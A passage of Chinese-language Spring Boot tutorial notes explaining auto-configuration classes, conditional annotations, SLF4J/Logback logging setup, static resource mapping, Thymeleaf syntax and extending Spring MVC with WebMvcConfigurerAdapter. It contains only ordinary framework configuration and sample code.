solr.SolrRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\\org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\\org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\\org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\\org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\\org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\\org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\\org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\\org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\\org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\\org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\\org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\\org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\\org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\\org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\\org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\\org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\\org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\\org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\\org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\\org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\\org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\\org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\\org.springframework.boot.autoconfigure.mobile.DeviceResolverAutoConfiguration,\\org.springframework.boot.autoconfigure.mobile.DeviceDelegatingViewResolverAutoConfiguration,\\org.springframework.boot.autoconfigure.mobile.SitePreferenceAutoConfiguration,\\org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\\org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\\org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\\org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\\org.springframework.boot.autoconfigure.reactor.ReactorAutoConfiguration,\\org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration,\\org.springframework.boot.autoconfigure.security.SecurityFilterAutoConfiguration,\\org.springframework.boot.autoconfigure.security.FallbackWebSecurityAutoConfiguration,\\org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration,\\org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\\org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\\org.springframework.boot.autoconfigure.social.SocialWebAutoConfiguration,\\org.springframework.boot.autoconfigure.social.FacebookAutoConfiguration,\\org.springframework.boot.autoconfigure.social.LinkedInAutoConfiguration,\\org.springframework.boot.autoconfigure.social.TwitterAutoConfiguration,\\org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\\org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\\org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\\org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\\org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\\org.springframework.boot.autoconfigure.web.DispatcherServletAutoConfiguration,\\org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration,\\org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.web.HttpEncodingAutoConfiguration,\\org.springframework.boot.autoconfigure.web.HttpMessageConvertersAutoConfiguration,\\org.springframework.boot.autoconfigure.web.MultipartAutoConfiguration,\\org.springframework.boot.autoconfigure.web.ServerPropertiesAutoConfiguration,\\org.springframework.boot.autoconfigure.web.WebClientAutoConfiguration,\\org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.websocket.WebSocketAutoConfiguration,\\org.springframework.boot.autoconfigure.websocket.WebSocketMessagingAutoConfiguration,\\org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration 每一个这样的 xxxAutoConfiguration类都是容器中的一个组件，都加入到容器中；用他们来做自动配置； 3）、每一个自动配置类进行自动配置功能； 4）、以HttpEncodingAutoConfiguration（Http编码自动配置）为例解释自动配置原理； 12345678910111213141516171819202122232425262728@Configuration //表示这是一个配置类，以前编写的配置文件一样，也可以给容器中添加组件@EnableConfigurationProperties(HttpEncodingProperties.class) //启动指定类的ConfigurationProperties功能；将配置文件中对应的值和HttpEncodingProperties绑定起来；并把HttpEncodingProperties加入到ioc容器中@ConditionalOnWebApplication //Spring底层@Conditional注解（Spring注解版），根据不同的条件，如果满足指定的条件，整个配置类里面的配置就会生效； 判断当前应用是否是web应用，如果是，当前配置类生效@ConditionalOnClass(CharacterEncodingFilter.class) //判断当前项目有没有这个类CharacterEncodingFilter；SpringMVC中进行乱码解决的过滤器；@ConditionalOnProperty(prefix = \"spring.http.encoding\", value = \"enabled\", matchIfMissing = true) //判断配置文件中是否存在某个配置 spring.http.encoding.enabled；如果不存在，判断也是成立的//即使我们配置文件中不配置pring.http.encoding.enabled=true，也是默认生效的；public class HttpEncodingAutoConfiguration { //他已经和SpringBoot的配置文件映射了 private final HttpEncodingProperties properties; //只有一个有参构造器的情况下，参数的值就会从容器中拿 public HttpEncodingAutoConfiguration(HttpEncodingProperties properties) { this.properties = properties; } @Bean //给容器中添加一个组件，这个组件的某些值需要从properties中获取 @ConditionalOnMissingBean(CharacterEncodingFilter.class) //判断容器没有这个组件？ public CharacterEncodingFilter characterEncodingFilter() { CharacterEncodingFilter filter = new OrderedCharacterEncodingFilter(); filter.setEncoding(this.properties.getCharset().name()); filter.setForceRequestEncoding(this.properties.shouldForce(Type.REQUEST)); filter.setForceResponseEncoding(this.properties.shouldForce(Type.RESPONSE)); return filter; } 根据当前不同的条件判断，决定这个配置类是否生效？ 一但这个配置类生效；这个配置类就会给容器中添加各种组件；这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的； 5）、所有在配置文件中能配置的属性都是在xxxxProperties类中封装者‘；配置文件能配置什么就可以参照某个功能对应的这个属性类 1234@ConfigurationProperties(prefix = \"spring.http.encoding\") //从配置文件中获取指定的值和bean的属性进行绑定public class HttpEncodingProperties { public static final Charset DEFAULT_CHARSET = Charset.forName(\"UTF-8\"); 精髓： ​ 1）、SpringBoot启动会加载大量的自动配置类 ​ 2）、我们看我们需要的功能有没有SpringBoot默认写好的自动配置类； ​ 3）、我们再来看这个自动配置类中到底配置了哪些组件；（只要我们要用的组件有，我们就不需要再来配置了） ​ 4）、给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们就可以在配置文件中指定这些属性的值； xxxxAutoConfigurartion：自动配置类； 给容器中添加组件 xxxxProperties:封装配置文件中相关属性； 2、细节1、@Conditional派生注解（Spring注解版原生的@Conditional作用）作用：必须是@Conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效； @Conditional扩展注解 作用（判断是否满足当前指定条件） @ConditionalOnJava 系统的java版本是否符合要求 @ConditionalOnBean 容器中存在指定Bean； @ConditionalOnMissingBean 容器中不存在指定Bean； @ConditionalOnExpression 满足SpEL表达式指定 @ConditionalOnClass 系统中有指定的类 @ConditionalOnMissingClass 系统中没有指定的类 @ConditionalOnSingleCandidate 容器中只有一个指定的Bean，或者这个Bean是首选Bean @ConditionalOnProperty 系统中指定的属性是否有指定的值 @ConditionalOnResource 类路径下是否存在指定资源文件 @ConditionalOnWebApplication 当前是web环境 @ConditionalOnNotWebApplication 当前不是web环境 @ConditionalOnJndi JNDI存在指定项 自动配置类必须在一定的条件下才能生效； 我们怎么知道哪些自动配置类生效； **==我们可以通过启用 debug=true属性；来让控制台打印自动配置报告==**，这样我们就可以很方便的知道哪些自动配置类生效； 123456789101112131415161718192021222324=========================AUTO-CONFIGURATION REPORT=========================Positive matches:（自动配置类启用的）----------------- DispatcherServletAutoConfiguration matched: - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet'; @ConditionalOnMissingClass did not find unwanted class (OnClassCondition) - @ConditionalOnWebApplication (required) found StandardServletEnvironment (OnWebApplicationCondition) Negative matches:（没有启动，没有匹配成功的自动配置类）----------------- ActiveMQAutoConfiguration: Did not match: - @ConditionalOnClass did not find required classes 'javax.jms.ConnectionFactory', 'org.apache.activemq.ActiveMQConnectionFactory' (OnClassCondition) AopAutoConfiguration: Did not match: - @ConditionalOnClass did not find required classes 'org.aspectj.lang.annotation.Aspect', 'org.aspectj.lang.reflect.Advice' (OnClassCondition) 三、日志1、日志框架 小张；开发一个大型系统； ​ 1、System.out.println(“”)；将关键数据打印在控制台；去掉？写在一个文件？ ​ 2、框架来记录系统的一些运行时信息；日志框架 ； zhanglogging.jar； ​ 3、高大上的几个功能？异步模式？自动归档？xxxx？ zhanglogging-good.jar？ ​ 4、将以前框架卸下来？换上新的框架，重新修改之前相关的API；zhanglogging-prefect.jar； ​ 5、JDBC—数据库驱动； ​ 写了一个统一的接口层；日志门面（日志的一个抽象层）；logging-abstract.jar； ​ 给项目中导入具体的日志实现就行了；我们之前的日志框架都是实现的抽象层； 市面上的日志框架； JUL、JCL、Jboss-logging、logback、log4j、log4j2、slf4j…. 日志门面 （日志的抽象层） 日志实现 JCL（Jakarta Commons Logging） SLF4j（Simple Logging Facade for Java） jboss-logging Log4j JUL（java.util.logging） Log4j2 Logback 左边选一个门面（抽象层）、右边来选一个实现； 日志门面： SLF4J； 日志实现：Logback； SpringBoot：底层是Spring框架，Spring框架默认是用JCL；‘ ​ ==SpringBoot选用 SLF4j和logback；== 2、SLF4j使用1、如何在系统中使用SLF4j https://www.slf4j.org以后开发的时候，日志记录方法的调用，不应该来直接调用日志的实现类，而是调用日志抽象层里面的方法； 给系统里面导入slf4j的jar和 logback的实现jar 123456789import org.slf4j.Logger;import org.slf4j.LoggerFactory;public class HelloWorld { public static void main(String[] args) { Logger logger = LoggerFactory.getLogger(HelloWorld.class); logger.info(\"Hello World\"); }} 图示； 每一个日志的实现框架都有自己的配置文件。使用slf4j以后，配置文件还是做成日志实现框架自己本身的配置文件； 2、遗留问题a（slf4j+logback）: Spring（commons-logging）、Hibernate（jboss-logging）、MyBatis、xxxx 统一日志记录，即使是别的框架和我一起统一使用slf4j进行输出？ 如何让系统中所有的日志都统一到slf4j； ==1、将系统中其他日志框架先排除出去；== ==2、用中间包来替换原有的日志框架；== ==3、我们导入slf4j其他的实现== 3、SpringBoot日志关系1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;&lt;/dependency&gt; SpringBoot使用它来做日志功能； 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;/dependency&gt; 底层依赖关系 总结： ​ 1）、SpringBoot底层也是使用slf4j+logback的方式进行日志记录 ​ 2）、SpringBoot也把其他的日志都替换成了slf4j； ​ 3）、中间替换包？ 123456@SuppressWarnings(\"rawtypes\")public abstract class LogFactory { static String UNSUPPORTED_OPERATION_IN_JCL_OVER_SLF4J = \"http://www.slf4j.org/codes.html#unsupported_operation_in_jcl_over_slf4j\"; static LogFactory logFactory = new SLF4JLogFactory(); ​ 4）、如果我们要引入其他框架？一定要把这个框架的默认日志依赖移除掉？ ​ Spring框架用的是commons-logging； 12345678910&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; ==SpringBoot能自动适配所有的日志，而且底层使用slf4j+logback的方式记录日志，引入其他框架的时候，只需要把这个框架依赖的日志框架排除掉即可；== 4、日志使用；1、默认配置SpringBoot默认帮我们配置好了日志； 123456789101112131415161718//记录器Logger logger = LoggerFactory.getLogger(getClass());@Testpublic void contextLoads() { //System.out.println(); //日志的级别； //由低到高 trace&lt;debug&lt;info&lt;warn&lt;error //可以调整输出的日志级别；日志就只会在这个级别以以后的高级别生效 logger.trace(\"这是trace日志...\"); logger.debug(\"这是debug日志...\"); //SpringBoot默认给我们使用的是info级别的，没有指定级别的就用SpringBoot默认规定的级别；root级别 logger.info(\"这是info日志...\"); logger.warn(\"这是warn日志...\"); logger.error(\"这是error日志...\");} 日志输出格式： %d表示日期时间， %thread表示线程名， %-5level：级别从左显示5个字符宽度 %logger{50} 表示logger名字最长50个字符，否则按照句点分割。 %msg：日志消息， %n是换行符 --&gt; %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n SpringBoot修改日志的默认配置 123456789101112131415logging.level.com.atguigu=trace#logging.path=# 不指定路径在当前项目下生成springboot.log日志# 可以指定完整的路径；#logging.file=G:/springboot.log# 在当前磁盘的根路径下创建spring文件夹和里面的log文件夹；使用&nbsp;spring.log 作为默认文件logging.path=/spring/log# 在控制台输出的日志的格式logging.pattern.console=%d{yyyy-MM-dd} [%thread] %-5level %logger{50} - %msg%n# 指定文件中日志输出的格式logging.pattern.file=%d{yyyy-MM-dd} === [%thread] === %-5level === %logger{50} ==== %msg%n logging.file logging.path Example Description (none) (none) 只在控制台输出 指定文件名 (none) my.log 输出日志到my.log文件 (none) 指定目录 /var/log 输出到指定目录的 spring.log 文件中 2、指定配置给类路径下放上每个日志框架自己的配置文件即可；SpringBoot就不使用他默认配置的了 Logging System Customization Logback logback-spring.xml, logback-spring.groovy, logback.xml or logback.groovy Log4j2 log4j2-spring.xml or log4j2.xml JDK (Java Util Logging) logging.properties logback.xml：直接就被日志框架识别了； logback-spring.xml：日志框架就不直接加载日志的配置项，由SpringBoot解析日志配置，可以使用SpringBoot的高级Profile功能 12345&lt;springProfile name=\"staging\"&gt; &lt;!-- configuration to be enabled when the \"staging\" profile is active --&gt; 可以指定某段配置只在某个环境下生效&lt;/springProfile&gt; 如： 12345678910111213141516171819&lt;appender name=\"stdout\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;!-- 日志输出格式： %d表示日期时间， %thread表示线程名， %-5level：级别从左显示5个字符宽度 %logger{50} 表示logger名字最长50个字符，否则按照句点分割。 %msg：日志消息， %n是换行符 --&gt; &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt; &lt;springProfile name=\"dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} ----&gt; [%thread] ---&gt; %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=\"!dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} ==== [%thread] ==== %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;/layout&gt; &lt;/appender&gt; 如果使用logback.xml作为日志配置文件，还要使用profile功能，会有以下错误 no applicable action for [springProfile] 5、切换日志框架可以按照slf4j的日志适配图，进行相关的切换； slf4j+log4j的方式； 1234567891011121314151617181920&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;artifactId&gt;log4j-over-slf4j&lt;/artifactId&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;&lt;/dependency&gt; 切换为log4j2 123456789101112131415 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;/dependency&gt; 四、Web开发1、简介使用SpringBoot； 1）、创建SpringBoot应用，选中我们需要的模块； 2）、SpringBoot已经默认将这些场景配置好了，只需要在配置文件中指定少量配置就可以运行起来 3）、自己编写业务代码； 自动配置原理？ 这个场景SpringBoot帮我们配置了什么？能不能修改？能修改哪些配置？能不能扩展？xxx 123xxxxAutoConfiguration：帮我们给容器中自动配置组件；xxxxProperties:配置类来封装配置文件的内容； 2、SpringBoot对静态资源的映射规则；123@ConfigurationProperties(prefix = \"spring.resources\", ignoreUnknownFields = false)public class ResourceProperties implements ResourceLoaderAware { //可以设置和静态资源有关的参数，缓存时间等 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465WebMvcAuotConfiguration： @Override public void addResourceHandlers(ResourceHandlerRegistry registry) { if (!this.resourceProperties.isAddMappings()) { logger.debug(\"Default resource handling disabled\"); return; } Integer cachePeriod = this.resourceProperties.getCachePeriod(); if (!registry.hasMappingForPattern(\"/webjars/**\")) { customizeResourceHandlerRegistration( registry.addResourceHandler(\"/webjars/**\") .addResourceLocations( \"classpath:/META-INF/resources/webjars/\") .setCachePeriod(cachePeriod)); } String staticPathPattern = this.mvcProperties.getStaticPathPattern(); //静态资源文件夹映射 if (!registry.hasMappingForPattern(staticPathPattern)) { customizeResourceHandlerRegistration( registry.addResourceHandler(staticPathPattern) .addResourceLocations( this.resourceProperties.getStaticLocations()) .setCachePeriod(cachePeriod)); } } //配置欢迎页映射 @Bean public WelcomePageHandlerMapping welcomePageHandlerMapping( ResourceProperties resourceProperties) { return new WelcomePageHandlerMapping(resourceProperties.getWelcomePage(), this.mvcProperties.getStaticPathPattern()); } //配置喜欢的图标 @Configuration @ConditionalOnProperty(value = \"spring.mvc.favicon.enabled\", matchIfMissing = true) public static class FaviconConfiguration { private final ResourceProperties resourceProperties; public FaviconConfiguration(ResourceProperties resourceProperties) { this.resourceProperties = resourceProperties; } @Bean public SimpleUrlHandlerMapping faviconHandlerMapping() { SimpleUrlHandlerMapping mapping = new SimpleUrlHandlerMapping(); mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + 1); //所有 **/favicon.ico mapping.setUrlMap(Collections.singletonMap(\"**/favicon.ico\", faviconRequestHandler())); return mapping; } @Bean public ResourceHttpRequestHandler faviconRequestHandler() { ResourceHttpRequestHandler requestHandler = new ResourceHttpRequestHandler(); requestHandler .setLocations(this.resourceProperties.getFaviconLocations()); return requestHandler; } } ==1）、所有 /webjars/** ，都去 classpath:/META-INF/resources/webjars/ 找资源；== ​ webjars：以jar包的方式引入静态资源； http://www.webjars.org/ localhost:8080/webjars/jquery/3.3.1/jquery.js 123456&lt;!--引入jquery-webjar--&gt;在访问的时候只需要写webjars下面资源的名称即可 &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;jquery&lt;/artifactId&gt; &lt;version&gt;3.3.1&lt;/version&gt; &lt;/dependency&gt; ==2）、”/**” 访问当前项目的任何资源，都去（静态资源的文件夹）找映射== 12345\"classpath:/META-INF/resources/\", \"classpath:/resources/\",\"classpath:/static/\", \"classpath:/public/\" \"/\"：当前项目的根路径 localhost:8080/abc === 去静态资源文件夹里面找abc ==3）、欢迎页； 静态资源文件夹下的所有index.html页面；被”/**”映射；== ​ localhost:8080/ 找index页面 ==4）、所有的 **/favicon.ico 都是在静态资源文件下找；== 3、模板引擎JSP、Velocity、Freemarker、Thymeleaf SpringBoot推荐的Thymeleaf； 语法更简单，功能更强大； 1、引入thymeleaf；123456789101112 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; 2.1.6 &lt;/dependency&gt;切换thymeleaf版本&lt;properties&gt; &lt;thymeleaf.version&gt;3.0.9.RELEASE&lt;/thymeleaf.version&gt; &lt;!-- 布局功能的支持程序 thymeleaf3主程序 layout2以上版本 --&gt; &lt;!-- thymeleaf2 layout1--&gt; &lt;thymeleaf-layout-dialect.version&gt;2.2.2&lt;/thymeleaf-layout-dialect.version&gt; &lt;/properties&gt; 2、Thymeleaf使用1234567891011@ConfigurationProperties(prefix = \"spring.thymeleaf\")public class ThymeleafProperties { private static final Charset DEFAULT_ENCODING = Charset.forName(\"UTF-8\"); private static final MimeType DEFAULT_CONTENT_TYPE = MimeType.valueOf(\"text/html\"); public static final String DEFAULT_PREFIX = \"classpath:/templates/\"; public static final String DEFAULT_SUFFIX = \".html\"; // 只要我们把HTML页面放在classpath:/templates/，thymeleaf就能自动渲染； 使用： 1、导入thymeleaf的名称空间 1&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; 2、使用thymeleaf语法； 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;成功！&lt;/h1&gt; &lt;!--th:text 将div里面的文本内容设置为 --&gt; &lt;div th:text=\"${hello}\"&gt;这是显示欢迎信息&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 3、语法规则1）、th:text；改变当前元素里面的文本内容； ​ th：任意html属性；来替换原生属性的值 2）、表达式？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869Simple expressions:（表达式语法） Variable Expressions: ${...}：获取变量值；OGNL； 1）、获取对象的属性、调用方法 2）、使用内置的基本对象： #ctx : the context object. #vars: the context variables. #locale : the context locale. #request : (only in Web Contexts) the HttpServletRequest object. #response : (only in Web Contexts) the HttpServletResponse object. #session : (only in Web Contexts) the HttpSession object. #servletContext : (only in Web Contexts) the ServletContext object. ${session.foo} 3）、内置的一些工具对象：#execInfo : information about the template being processed.#messages : methods for obtaining externalized messages inside variables expressions, in the same way as they would be obtained using #{…} syntax.#uris : methods for escaping parts of URLs/URIs#conversions : methods for executing the configured conversion service (if any).#dates : methods for java.util.Date objects: formatting, component extraction, etc.#calendars : analogous to #dates , but for java.util.Calendar objects.#numbers : methods for formatting numeric objects.#strings : methods for String objects: contains, startsWith, prepending/appending, etc.#objects : methods for objects in general.#bools : methods for boolean evaluation.#arrays : methods for arrays.#lists : methods for lists.#sets : methods for sets.#maps : methods for maps.#aggregates : methods for creating aggregates on arrays or collections.#ids : methods for dealing with id attributes that might be repeated (for example, as a result of an iteration). Selection Variable Expressions: *{...}：选择表达式：和${}在功能上是一样； 补充：配合 th:object=\"${session.user}： &lt;div th:object=\"${session.user}\"&gt; &lt;p&gt;Name: &lt;span th:text=\"*{firstName}\"&gt;Sebastian&lt;/span&gt;.&lt;/p&gt; &lt;p&gt;Surname: &lt;span th:text=\"*{lastName}\"&gt;Pepper&lt;/span&gt;.&lt;/p&gt; &lt;p&gt;Nationality: &lt;span th:text=\"*{nationality}\"&gt;Saturn&lt;/span&gt;.&lt;/p&gt; &lt;/div&gt; Message Expressions: #{...}：获取国际化内容 Link URL Expressions: @{...}：定义URL； @{/order/process(execId=${execId},execType='FAST')} Fragment Expressions: ~{...}：片段引用表达式 &lt;div th:insert=\"~{commons :: main}\"&gt;...&lt;/div&gt; Literals（字面量） Text literals: 'one text' , 'Another one!' ,… Number literals: 0 , 34 , 3.0 , 12.3 ,… Boolean literals: true , false Null literal: null Literal tokens: one , sometext , main ,…Text operations:（文本操作） String concatenation: + Literal substitutions: |The name is ${name}|Arithmetic operations:（数学运算） Binary operators: + , - , * , / , % Minus sign (unary operator): -Boolean operations:（布尔运算） Binary operators: and , or Boolean negation (unary operator): ! , notComparisons and equality:（比较运算） Comparators: &gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le ) Equality operators: == , != ( eq , ne )Conditional operators:条件运算（三元运算符） If-then: (if) ? (then) If-then-else: (if) ? (then) : (else) Default: (value) ?: (defaultvalue)Special tokens: No-Operation: _ 4、SpringMVC自动配置https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications 1. Spring MVC auto-configurationSpring Boot 自动配置好了SpringMVC 以下是SpringBoot对SpringMVC的默认配置:==（WebMvcAutoConfiguration）== Inclusion of ContentNegotiatingViewResolver and BeanNameViewResolver beans. 自动配置了ViewResolver（视图解析器：根据方法的返回值得到视图对象（View），视图对象决定如何渲染（转发？重定向？）） ContentNegotiatingViewResolver：组合所有的视图解析器的； ==如何定制：我们可以自己给容器中添加一个视图解析器；自动的将其组合进来；== Support for serving static resources, including support for WebJars (see below).静态资源文件夹路径,webjars Static index.html support. 静态首页访问 Custom Favicon support (see below). favicon.ico 自动注册了 of Converter, GenericConverter, Formatter beans. Converter：转换器； public String hello(User user)：类型转换使用Converter Formatter 格式化器； 2017.12.17===Date； 12345@Bean@ConditionalOnProperty(prefix = \"spring.mvc\", name = \"date-format\")//在文件中配置日期格式化的规则public Formatter&lt;Date&gt; dateFormatter() { return new DateFormatter(this.mvcProperties.getDateFormat());//日期格式化组件} ​ ==自己添加的格式化器转换器，我们只需要放在容器中即可== Support for HttpMessageConverters (see below). HttpMessageConverter：SpringMVC用来转换Http请求和响应的；User—Json； HttpMessageConverters 是从容器中确定；获取所有的HttpMessageConverter； ==自己给容器中添加HttpMessageConverter，只需要将自己的组件注册容器中（@Bean,@Component）== Automatic registration of MessageCodesResolver (see below).定义错误代码生成规则 Automatic use of a ConfigurableWebBindingInitializer bean (see below). ==我们可以配置一个ConfigurableWebBindingInitializer来替换默认的；（添加到容器）== 12初始化WebDataBinder；请求数据=====JavaBean； org.springframework.boot.autoconfigure.web：web的所有自动场景； If you want to keep Spring Boot MVC features, and you just want to add additional MVC configuration (interceptors, formatters, view controllers etc.) you can add your own @Configuration class of type WebMvcConfigurerAdapter, but without @EnableWebMvc. If you wish to provide custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter or ExceptionHandlerExceptionResolver you can declare a WebMvcRegistrationsAdapter instance providing such components. If you want to take complete control of Spring MVC, you can add your own @Configuration annotated with @EnableWebMvc. 2、扩展SpringMVC1234567&lt;mvc:view-controller path=\"/hello\" view-name=\"success\"/&gt;&lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path=\"/hello\"/&gt; &lt;bean&gt;&lt;/bean&gt; &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt; ==编写一个配置类（@Configuration），是WebMvcConfigurerAdapter类型；不能标注@EnableWebMvc==; 既保留了所有的自动配置，也能用我们扩展的配置； 1234567891011//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能@Configurationpublic class MyMvcConfig extends WebMvcConfigurerAdapter { @Override public void addViewControllers(ViewControllerRegistry registry) { // super.addViewControllers(registry); //浏览器发送 /atguigu 请求来到 success registry.addViewController(\"/atguigu\").setViewName(\"success\"); }} 原理： ​ 1）、WebMvcAutoConfiguration是SpringMVC的自动配置类 ​ 2）、在做其他自动配置时会导入；@Import(EnableWebMvcConfiguration.class) 123456789101112131415161718 @Configurationpublic static class EnableWebMvcConfiguration extends DelegatingWebMvcConfiguration { private final WebMvcConfigurerComposite configurers = new WebMvcConfigurerComposite(); //从容器中获取所有的WebMvcConfigurer @Autowired(required = false) public void setConfigurers(List&lt;WebMvcConfigurer&gt; configurers) { if (!CollectionUtils.isEmpty(configurers)) { this.configurers.addWebMvcConfigurers(configurers); //一个参考实现；将所有的WebMvcConfigurer相关配置都来一起调用； @Override // public void addViewControllers(ViewControllerRegistry registry) { // for (WebMvcConfigurer delegate : this.delegates) { // delegate.addViewControllers(registry); // } } }} ​ 3）、容器中所有的WebMvcConfigurer都会一起起作用； ​ 4）、我们的配置类也会被调用； ​ 效果：SpringMVC的自动配置和我们的扩展配置都会起作用； 3、全面接管SpringMVC；SpringBoot对SpringMVC的自动配置不需要了，所有都是我们自己配置；所有的SpringMVC的自动配置都失效了 我们需要在配置类中添加@EnableWebMvc即可； 123456789101112//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能@EnableWebMvc@Configurationpublic class MyMvcConfig extends 